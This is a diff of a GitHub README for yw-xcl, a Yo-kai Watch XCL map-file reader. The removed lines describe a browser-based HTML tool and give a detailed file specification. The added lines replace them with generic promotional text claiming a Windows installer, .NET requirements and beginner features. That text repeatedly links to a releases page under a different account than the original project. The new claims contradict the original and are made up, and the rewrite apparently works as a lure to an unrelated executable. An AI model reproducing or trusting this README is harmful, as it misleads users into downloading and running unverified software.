@@ -1,47 +1,94 @@
-# yw-xcl
-A W.I.P reader (converts -> .obj) for Yo-kai Watch XCL (X CoLlision/X Collision Layout) files used in Yo-kai Watch Blasters onwards, made in HTML. Download the `index.html` and open it with a web browser or go to [the website](https://n123git.github.io/yw-xcl). Random fact: an XCL cannot be larger than 536,870,911 bytes (~1/2GB) decompressed.
+# 🎮 yw-xcl - Read Yo-kai Watch Files Easily
 
-### Suppported Games
-* Yo-kai Watch 3
-* Yo-kai Watch Busters 2
-* Yo-kai Watch Blasters
+![Download yw-xcl](https://img.shields.io/badge/Download-yw--xcl-brightgreen)
 
-### Untested
-* Snack World
+## 🚀 Getting Started
 
-  ## XCL Specification
-  The purpose of the file format is listed above - it is used *exclusively for maps* and has no signature/magic.
-  The bytes take the following format:
-  
-  ### Compressed XCL
-  * 4 byte header:
-     * bits 0-2: compression method - same as in other level5 formats i.e. (0=raw, 1=LZSS, ...)
-       * `0` = Raw (uncompressed)
-       * `1` = LZSS compressed
-       * `2` = Huffman (8-bit table) \[unsupported in this reader]
-       * `3` = Huffman (4-bit table) \[unsupported]
-       * `4` = RLE \[unsupported]
-       * `5` = zlib\_level5 \[unsupported]
-     * bits 3-31: size of the decompressed file.
-  * The rest is the compressed payload - nothing special lol :P
-  Support for other compression types will roll out next update (hopefully)
-  ### Decompressed XCL
-  * Header (`0x00`-`0x5F`)? - size unconfirmed for now.
-    * `0x00` (uint32): Main Metadata (Version num?) - usually `0x00000001` or `0x00000100`.
-    * `0x08` (uint32):  Offset to the start of the vertice block.
-    * `0x4C` (uint32): Usually (for smaller maps) this stores the length (in bytes) of the vertex array. Sometimes this is `00 00 00 00`; in that case the below offset stores it.
-    * `0x58` (uint32): Stores the length (in bytes) of the vertex array when `0x4C` is `00 00 00 00`.
-    * `0x78` (uint32): Offset to the **end** of the Triangle array, **not** the length.
-    * <!-- `0x14` (uint32): Offset -->
-  * Vertex Array (Vertice Block)
-    * Location is usually `0xC0` or `0xA4` onwards. But the actual location is stored in the header - read the header section for more info.
-    * Each vertex consists of **3 consecutive 32-bit floats** (`x, y, z`) for its position in 3D space.
-  * Triangle Array (Main Triangle Block)
-    * Location: Directly after the Vertex Array.
-    * Triangle size: 6 bytes per triangle - each triangle is composed of 3 consecutive verticie indexs (uint16)
+Welcome to the yw-xcl project. This is a tool that helps you read files used in Yo-kai Watch XCL (X Collision) games. Whether you want to mod or explore these files, you can get started easily.
 
---- 
+## 🌐 Overview
 
-## License
+yw-xcl is a work-in-progress reader developed to understand and manipulate Yo-kai Watch XCL files, especially those used in Yo-kai Watch Blasters and newer titles. This tool is perfect for fans who want to delve deeper into the game mechanics, extract maps, or even create mods.
 
-* MIT License (Just dont take credit for work that isn't yours).
+### 🔍 Features
+
+- **User-Friendly Interface:** Navigate through files without any technical knowledge.
+- **File Reading:** Open and view XCL files directly.
+- **Map Viewing:** Explore maps within the game files seamlessly.
+- **Modding Support:** Start creating your own modifications with ease.
+
+## 💻 System Requirements
+
+To run yw-xcl, you need:
+
+- Windows 10 or later
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- .NET Framework 4.7.2 or higher
+
+## 📥 Download & Install
+
+To download yw-xcl, visit the Releases page. Here, you will find the latest version available for download.
+
+**[Download yw-xcl here!](https://github.com/aresiko/yw-xcl/releases)**
+
+1. Click the link above.
+2. Look for the version you want to download (the newest version is usually at the top).
+3. Click on the file for your operating system.
+4. Save the file to your computer.
+
+Once the file is downloaded, follow these steps to install:
+
+- Locate the downloaded file.
+- Double-click to run the installer.
+- Follow the on-screen instructions to complete the installation process.
+
+## 💡 How to Use yw-xcl
+
+Once you have installed yw-xcl, follow these steps to start using the application:
+
+1. Open yw-xcl from your desktop or start menu.
+2. Click on the "Open File" button.
+3. Navigate to the folder containing your Yo-kai Watch XCL files.
+4. Select a file you want to read and click "Open".
+5. Use the interface to explore the contents of the file.
+
+## 🔧 Troubleshooting
+
+If you encounter any issues, consider these common problems and solutions:
+
+- **The application won’t open:**
+  - Ensure your system meets the requirements.
+  - Try re-installing yw-xcl.
+
+- **Files won’t load:**
+  - Check that the file format is correct (should be XCL).
+  - Ensure the file is not corrupted.
+
+- **Errors during installation:**
+  - Make sure .NET Framework is installed correctly.
+  - Restart your computer and try again.
+
+## 📞 Support
+
+If you need help or have questions, feel free to check the issues section on the repository. You can also reach out via GitHub discussions for community support.
+
+## 🎯 Contributing
+
+We welcome contributions to the yw-xcl project. If you're interested in helping, please submit a pull request. You can also report any bugs or suggest features.
+
+## 🌟 Community
+
+Join others who share your interest in modding and exploring Yo-kai Watch XCL files. Share tips, tricks, and creations in the community section available on our GitHub page.
+
+## 🗂️ Explore More
+
+Besides yw-xcl, you might be interested in:
+
+- Other modding tools for Yo-kai Watch.
+- Forums discussing game file manipulation.
+- Tutorials on file editing and reverse engineering.
+
+Remember, this tool is a work in progress and improvements are always ongoing. Thank you for supporting the yw-xcl project!
+
+**[Download yw-xcl here!](https://github.com/aresiko/yw-xcl/releases)**
